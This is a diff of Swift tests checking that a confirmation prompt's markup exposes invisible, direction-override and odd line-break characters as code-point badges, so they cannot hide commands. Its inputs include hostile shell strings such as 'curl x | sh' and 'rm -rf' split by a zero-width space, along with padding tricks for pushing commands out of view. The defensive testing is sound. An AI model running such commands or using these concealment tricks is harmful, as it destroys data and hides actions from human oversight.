@@ -55,6 +55,48 @@ struct ConfirmDetailMarkupTests {
     #expect(markup.text.contains("curl x | sh"))
   }
 
+  @Test("a run of no-break spaces between two commands is one badge with its code point and length")
+  func hiddenByOtherSpaces() {
+    let detail = "git status" + String(repeating: "\u{00A0}", count: 300) + "; curl x | sh"
+    let markup = ConfirmDetailMarkup(detail)
+
+    #expect(markup.text == "git status[U+00A0\u{00D7}300]; curl x | sh")
+    #expect(markup.longestLine == 10 + 300 + 13)
+  }
+
+  @Test("invisible and direction characters are shown by their code point, never applied")
+  func invisibles() {
+    #expect(ConfirmDetailMarkup("rm\u{200B}-rf").text == "rm[U+200B]-rf")
+    #expect(ConfirmDetailMarkup("echo \u{202E}hs.x\u{202C}").text == "echo [U+202E]hs.x[U+202C]")
+    #expect(ConfirmDetailMarkup("\u{FEFF}ls").text == "[U+FEFF]ls")
+    #expect(ConfirmDetailMarkup("a\u{2066}\u{2069}b").text == "a[U+2066][U+2069]b")
+    #expect(ConfirmDetailMarkup("a\u{1B}[2Kb").text == "a[U+001B][2Kb")
+    #expect(ConfirmDetailMarkup("a\u{3164}b\u{2800}c").text == "a[U+3164]b[U+2800]c")
+  }
+
+  @Test("a line break that is not \\n stays on its line, shown, so it cannot push text out of view")
+  func otherLineBreaks() {
+    let detail = "git status" + String(repeating: "\u{2028}", count: 80) + "curl x | sh"
+    let markup = ConfirmDetailMarkup(detail)
+
+    #expect(markup.text == "git status[U+2028\u{00D7}80]curl x | sh")
+    #expect(markup.lines == 1)
+    #expect(ConfirmDetailMarkup("a\rb").text == "a[U+000D]b", "a lone carriage return")
+    #expect(ConfirmDetailMarkup("a\u{0B}\u{0C}\u{85}\u{2029}b").text == "a[U+000B][U+000C][U+0085][U+2029]b")
+  }
+
+  @Test("a line of only invisible characters is shown, not counted as blank")
+  func invisibleLines() {
+    let detail = "a\n\u{3000}\u{3000}\n\n\nb"
+    #expect(ConfirmDetailMarkup(detail).text == "a\n[U+3000\u{00D7}2]\n\n\nb")
+  }
+
+  @Test("letters, accents and emoji outside those classes are drawn as they are")
+  func ordinaryText() {
+    let detail = "caf\u{00E9} \u{2713} \u{1F600} na\u{0303}o"
+    #expect(ConfirmDetailMarkup(detail).text == detail)
+  }
+
   @Test("the counts are of the original")
   func counts() {
     let markup = ConfirmDetailMarkup("ab\ncdef\n\n\n\nx")
